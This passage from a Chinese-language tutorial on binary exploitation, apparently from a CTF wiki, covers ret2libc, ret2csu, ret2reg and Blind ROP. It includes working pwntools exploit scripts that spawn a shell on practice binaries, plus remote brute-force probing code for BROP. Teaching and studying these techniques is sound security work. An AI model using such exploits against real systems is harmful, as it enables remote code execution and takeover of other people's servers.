payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)
sh.interactive()

```

### 题目

*   train.cs.nctu.edu.tw: ret2libc

题目
--

*   train.cs.nctu.edu.tw: rop
*   2013-PlaidCTF-ropasaurusrex
*   Defcon 2015 Qualifier: R0pbaby

参考阅读
----

*   [乌云一步一步 ROP 篇 (蒸米)](http://wooyun.jozxing.cc/static/drops/tips-6597.html)
*   [手把手教你栈溢出从入门到放弃（上）](https://zhuanlan.zhihu.com/p/25816426)
*   [手把手教你栈溢出从入门到放弃（下）](https://zhuanlan.zhihu.com/p/25892385)
*   [【技术分享】现代栈溢出利用技术基础：ROP](http://bobao.360.cn/learning/detail/3694.html)

中级 ROP 主要是使用了一些比较巧妙的 Gadgets。

ret2csu
-------

### 原理

在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)

```
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp

```

这里我们可以利用以下几点

*   从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。
*   从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，**但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）**，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。
*   从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。

### 示例

这里我们以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。首先检查程序的安全保护

```
➜  ret2__libc_csu_init git:(iromise) ✗ checksec level5
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

程序为 64 位，开启了堆栈不可执行保护。

其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出

```
ssize_t vulnerable_function()
{
  char buf; // [sp+0h] [bp-80h]@1
  return read(0, &buf, 0x200uLL);
}

```

简单浏览下程序，发现程序中既没有 system 函数地址，也没有 /bin/sh 字符串，所以两者都需要我们自己去构造了。

**注：这里我尝试在我本机使用 system 函数来获取 shell 失败了，应该是环境变量的问题，所以这里使用的是 execve 来获取 shell。**

基本利用思路如下

*   利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数
*   根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址
*   再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。
*   再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。

exp 如下

```
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'
level5 = ELF('./level5')
sh = process('./level5')
write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)
sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)
write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)
## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')
sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()

```

### 思考

#### 改进

在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法

##### 改进 1 - 提前控制 rbx 与 rbp

可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。

##### 改进 2 - 多次利用

其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件

*   漏洞可以被多次触发
*   在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。

**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**

#### gadget

其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数

```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini

```

我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。

需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器

*   利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。
*   利用中间部分的代码控制了 rdx，rsi，edi。

而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，**可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。**而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。

```
gef➤  x/5i 0x000000000040061A
   0x40061a <__libc_csu_init+90>:    pop    rbx
   0x40061b <__libc_csu_init+91>:    pop    rbp
   0x40061c <__libc_csu_init+92>:    pop    r12
   0x40061e <__libc_csu_init+94>:    pop    r13
   0x400620 <__libc_csu_init+96>:    pop    r14
gef➤  x/5i 0x000000000040061b
   0x40061b <__libc_csu_init+91>:    pop    rbp
   0x40061c <__libc_csu_init+92>:    pop    r12
   0x40061e <__libc_csu_init+94>:    pop    r13
   0x400620 <__libc_csu_init+96>:    pop    r14
   0x400622 <__libc_csu_init+98>:    pop    r15
gef➤  x/5i 0x000000000040061A+3
   0x40061d <__libc_csu_init+93>:    pop    rsp
   0x40061e <__libc_csu_init+94>:    pop    r13
   0x400620 <__libc_csu_init+96>:    pop    r14
   0x400622 <__libc_csu_init+98>:    pop    r15
   0x400624 <__libc_csu_init+100>:    ret
gef➤  x/5i 0x000000000040061e
   0x40061e <__libc_csu_init+94>:    pop    r13
   0x400620 <__libc_csu_init+96>:    pop    r14
   0x400622 <__libc_csu_init+98>:    pop    r15
   0x400624 <__libc_csu_init+100>:    ret
   0x400625:    nop
gef➤  x/5i 0x000000000040061f
   0x40061f <__libc_csu_init+95>:    pop    rbp
   0x400620 <__libc_csu_init+96>:    pop    r14
   0x400622 <__libc_csu_init+98>:    pop    r15
   0x400624 <__libc_csu_init+100>:    ret
   0x400625:    nop
gef➤  x/5i 0x0000000000400620
   0x400620 <__libc_csu_init+96>:    pop    r14
   0x400622 <__libc_csu_init+98>:    pop    r15
   0x400624 <__libc_csu_init+100>:    ret
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
gef➤  x/5i 0x0000000000400621
   0x400621 <__libc_csu_init+97>:    pop    rsi
   0x400622 <__libc_csu_init+98>:    pop    r15
   0x400624 <__libc_csu_init+100>:    ret
   0x400625:    nop
gef➤  x/5i 0x000000000040061A+9
   0x400623 <__libc_csu_init+99>:    pop    rdi
   0x400624 <__libc_csu_init+100>:    ret
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400630 <__libc_csu_fini>:    repz ret

```

### 题目

*   2016 XDCTF pwn100
*   2016 华山杯 SU_PWN

### 参考阅读

*   [http://wooyun.jozxing.cc/static/drops/papers-7551.html](http://wooyun.jozxing.cc/static/drops/papers-7551.html)
*   [http://wooyun.jozxing.cc/static/drops/binary-10638.html](http://wooyun.jozxing.cc/static/drops/binary-10638.html)

ret2reg
-------

### 原理

1.  查看溢出函返回时哪个寄存值指向溢出缓冲区空间
2.  然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址
3.  reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)

JOP
---

Jump-oriented programming

COP
---

Call-oriented programming

BROP
----

### 基本介绍

BROP(Blind ROP) 于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014，其论文题目是 **Hacking Blind**，下面是作者对应的 paper 和 slides, 以及作者相应的介绍

*   [paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)
*   [slide](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)

BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。

### 攻击条件

1.  源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
2.  服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。

### 攻击原理

目前，大部分应用都会开启 ASLR、NX、Canary 保护。这里我们分别讲解在 BROP 中如何绕过这些保护，以及如何进行攻击。

#### 基本思路

在 BROP 中，基本的遵循的思路如下

*   判断栈溢出长度
    *   暴力枚举
*   Stack Reading
    *   获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。
*   Blind ROP
    *   找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。
*   Build the exploit
    *   利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。

#### 栈溢出长度

直接从 1 暴力枚举即可，直到发现程序崩溃。

#### Stack Reading

如下所示，这是目前经典的栈布局

```
buffer|canary|saved fame pointer|saved returned address
```

要向得到 canary 以及之后的变量，我们需要解决第一个问题，如何得到 overflow 的长度，这个可以通过不断尝试来获取。

其次，关于 canary 以及后面的变量，所采用的的方法一致，这里我们以 canary 为例。

canary 本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。

需要注意的是，攻击条件 2 表明了程序本身并不会因为 crash 有变化，所以每次的 canary 等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有 256 种可能，所以在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==)

#### Blind ROP

##### 基本思路

最朴素的执行 write 函数的方法就是构造系统调用。

```
pop rdi; ret # socket
pop rsi; ret # buffer
pop rdx; ret # length
pop rax; ret # write syscall number
syscall

```

但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。

###### BROP gadgets

首先，在 libc_csu_init 的结尾一长串的 gadgets，我们可以通过偏移来获取 write 函数调用的前两个参数。正如文中所展示的

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==)

###### find a call write

我们可以通过 plt 表来获取 write 的地址。

###### control rdx

需要注意的是，rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可。一般来说程序中的 rdx 经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序

```
pop rdx; ret
```

这样的指令几乎没有。那么，我们该如何控制 rdx 的数值呢？这里需要说明执行 strcmp 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。

那么接下来的问题，我们就可以分为两项

*   寻找 gadgets
*   寻找 PLT 表
    *   write 入口
    *   strcmp 入口

##### 寻找 gadgets

首先，我们来想办法寻找 gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况

*   程序直接崩溃
*   程序运行一段时间后崩溃
*   程序一直运行而并不崩溃

为了寻找合理的 gadgets，我们可以分为以下两步

###### 寻找 stop gadgets

所谓`stop gadget`一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。

> 其实 stop gadget 也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个 gadgets。

之所以要寻找 stop gadgets，是因为当我们猜到某个 gadgtes 后，如果我们仅仅是将其布置在栈上，由于执行完这个 gadget 之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会 crash。这样的话，在攻击者看来程序只是单纯的 crash 了。因此，攻击者就会认为在这个过程中并没有执行到任何的`useful gadget`，从而放弃它。例子如下图

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==)

但是，如果我们布置了`stop gadget`，那么对于我们所要尝试的每一个地址，如果它是一个 gadget 的话，那么程序不会崩溃。接下来，就是去想办法识别这些 gadget。

###### 识别 gadgets

那么，我们该如何识别这些 gadgets 呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址

*   **Probe**
    *   探针，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。
*   **Stop**
    *   不会使得程序崩溃的 stop gadget 的地址。
*   **Trap**
    *   可以导致程序崩溃的地址

我们可以通过在栈上摆放不同顺序的 **Stop** 与 **Trap** 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子

*   probe,stop,traps(traps,traps,…)
    *   我们通过程序崩溃与否 (**如果程序在 probe 处直接崩溃怎么判断**) 可以找到不会对栈进行 pop 操作的 gadget，如
        *   ret
        *   xor eax,eax; ret
*   probe,trap,stop,traps
    *   我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如
        *   pop rax; ret
        *   pop rdi; ret
*   probe, trap, trap, trap, trap, trap, trap, stop, traps
    *   我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。**这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，**这里一般来说会遇到两处比较有意思的地方
        *   plt 处不会崩，，
        *   _start 处不会崩，相当于程序重新执行。

之所以要在每个布局的后面都放上 trap，是为了能够识别出，当我们的 probe 处对应的地址执行的指令跳过了 stop，程序立马崩溃的行为。

但是，即使是这样，我们仍然难以识别出正在执行的 gadget 到底是在对哪个寄存器进行操作。

但是，需要注意的是向 BROP 这样的一下子弹出 6 个寄存器的 gadgets，程序中并不经常出现。所以，如果我们发现了这样的 gadgets，那么，有很大的可能性，这个 gadgets 就是 brop gadgets。此外，这个 gadgets 通过错位还可以生成 pop rsp 等这样的 gadgets，可以使得程序崩溃也可以作为识别这个 gadgets 的标志。

此外，根据我们之前学的 ret2libc_csu_init 可以知道该地址减去 0x1a 就会得到其上一个 gadgets。可以供我们调用其它函数。

需要注意的是 probe 可能是一个 stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为 trap 地址即可。因为如果是 stop gadget 的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.

##### 寻找 PLT

如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==)

此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。

##### 控制 rdx

当我们找到 plt 表之后，下面，我们就该想办法来控制 rdx 的数值了，那么该如何确认 strcmp 的位置呢？需要提前说的是，并不是所有的程序都会调用 strcmp 函数，所以在没有调用 strcmp 函数的情况下，我们就得利用其它方式来控制 rdx 的值了。这里给出程序中使用 strcmp 函数的情况。

之前，我们已经找到了 brop 的 gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址

*   readable，可读的地址。
*   bad, 非法地址，不可访问，比如说 0x0。

那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况

*   strcmp(bad,bad)
*   strcmp(bad,readable)
*   strcmp(readable,bad)
*   strcmp(readable,readable)

只有最后一种格式，程序才会正常执行。

**注**：在没有 PIE 保护的时候，64 位程序的 ELF 文件的 0x400000 处有 7 个非零字节。

那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个 plt 表项，但是这个却比较麻烦。我们可以选择如下的一种方法

*   利用 plt 表项的慢路径
*   并且利用下一个表项的慢路径的地址来覆盖返回地址

这样，我们就不用来回控制相应的变量了。

当然，我们也可能碰巧找到 strncmp 或者 strcasecmp 函数，它们具有和 strcmp 一样的效果。

##### 寻找输出函数

寻找输出函数既可以寻找 write，也可以寻找 puts。一般现先找 puts 函数。不过这里为了介绍方便，先介绍如何寻找 write。

###### 寻找 write@plt

当我们可以控制 write 函数的三个参数的时候，我们就可以再次遍历所有的 plt 表，根据 write 函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值

*   使用 rop chain，同时使得每个 rop 对应的文件描述符不一样
*   同时打开多个连接，并且我们使用相对较高的数值来试一试。

需要注意的是

*   linux 默认情况下，一个进程最多只能打开 1024 个文件描述符。
*   posix 标准每次申请的文件描述符数值总是当前最小可用数值。

当然，我们也可以选择寻找 puts 函数。

###### 寻找 puts@plt

寻找 puts 函数 (这里我们寻找的是 plt)，我们自然需要控制 rdi 参数，在上面，我们已经找到了 brop gadget。那么，我们根据 brop gadget 偏移 9 可以得到相应的 gadgets（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。所以我们可以根据这个来进行判断。一般来说，其 payload 如下

```
payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

#### 攻击总结

此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出. text 段更多的内容以便于来找到更多合适 gadgets。同时，攻击者还可以找到一些其它函数，如 dup2 或者 execve 函数。一般来说，攻击者此时会去做下事情

*   将 socket 输出重定向到输入输出
*   寻找 “/bin/sh” 的地址。一般来说，最好是找到一块可写的内存，利用 write 函数将这个字符串写到相应的地址。
*   执行 execve 获取 shell，获取 execve 不一定在 plt 表中，此时攻击者就需要想办法执行系统调用了。

### 例子

这里我们以 [HCTF2016 的出题人失踪了](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop) 为例。基本思路如下

#### 确定栈溢出长度

```
def getbufferflow_length():
    i = 1
    while 1:
        try:
            sh = remote('127.0.0.1', 9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            sh.send(i * 'a')
            output = sh.recv()
            sh.close()
            if not output.startswith('No password'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1

```

根据上面，我们可以确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。

#### 寻找 stop gadgets

寻找过程如下

```
def get_stop_addr(length):
    addr = 0x400000
    while 1:
        try:
            sh = remote('127.0.0.1', 9999)
            sh.recvuntil('password?\n')
            payload = 'a' * length + p64(addr)
            sh.sendline(payload)
            sh.recv()
            sh.close()
            print 'one success addr: 0x%x' % (addr)
            return addr
        except Exception:
            addr += 1
            sh.close()

```

